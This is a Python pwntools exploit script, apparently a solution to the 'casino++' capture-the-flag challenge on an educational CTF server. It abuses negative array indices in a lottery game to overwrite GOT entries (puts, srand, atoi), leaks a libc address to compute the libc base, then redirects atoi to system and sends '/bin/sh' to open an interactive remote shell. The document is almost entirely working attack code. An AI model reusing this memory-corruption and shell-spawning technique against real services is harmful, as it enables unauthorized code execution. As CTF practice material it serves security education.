from pwn import *
wrong = ["99", "99", "99", "99", "99", "99"]
lottery1 = ["61", "68", "32", "22", "69", "20"]
lottery2 = ["22", "67", "58", "53", "74", "3"]

def  lott(n,pas,lo) :
    for i in range(6) :
        print r.recvuntil(':')
        r.sendline(lo[i])
    print r.recvuntil('Change the number? [1:yes 0:no]:')
    r.sendline("1")
    print r.recvuntil(':')
    r.sendline(n)
    print r.recvuntil(':')
    r.sendline(pas)

local = False
elf = 'casino++' 

if local: 
    context.binary = './'+elf
    r = process("./"+elf)
else: 
    ip = "edu-ctf.csie.org"
    port = 10176
    r = remote(ip,port)

context.arch = 'amd64'
l = ELF('./libc.so')
raw_input("aaa")
name =  'a' * 0x10 + p64(0x601ff0)
age = "123"

print r.recvuntil('name:')
r.sendline(name)
r.recvuntil('Your age:')
r.sendline(age)
# change put to casino
lott( "-42","0",wrong )
lott( "-43","4196701",lottery1  )
# change srand to put_plt+6
lott( "-34","0" ,wrong )
lott( "-35","4196070" ,lottery1 )
print r.recv()
l.address = u64( r.recv(6) + '\0\0' ) - 0x21ab0
success( 'libc_bass -> %s ' , hex( l.address ))
onegadget = hex( l.address + 0x10a38c)
lib_system = hex( l.sym.system)
# change atoi to system
lott( "-29",str( int(lib_system[6:] ,16) ) ,wrong)
print r.recvuntil(':')
r.sendline('/bin/sh')
r.interactive()